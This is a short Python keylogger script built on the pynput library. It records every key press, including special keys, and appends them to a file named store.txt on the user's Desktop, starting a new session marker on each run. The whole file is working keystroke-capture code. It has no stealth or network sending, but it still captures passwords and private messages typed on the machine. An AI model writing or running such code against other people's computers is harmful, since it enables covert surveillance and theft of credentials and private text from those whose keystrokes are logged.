from pynput import keyboard
import os

# Set log file path
log_file = os.path.expanduser("~/Desktop/store.txt")

def on_press(key):
    """Logs the pressed key into a file."""
    try:
        with open(log_file, "a") as logkey:
            if hasattr(key, 'char') and key.char is not None:
                logkey.write(key.char)  # Normal characters
            else:
                logkey.write(f" [{key}] ")  # Special keys like Space, Enter, Shift
    except Exception as e:
        print(f"Error logging key: {e}")

if __name__ == "__main__":
    with open(log_file, "a") as logkey:
        logkey.write("\n\n--- NEW SESSION ---\n\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keeps the script running
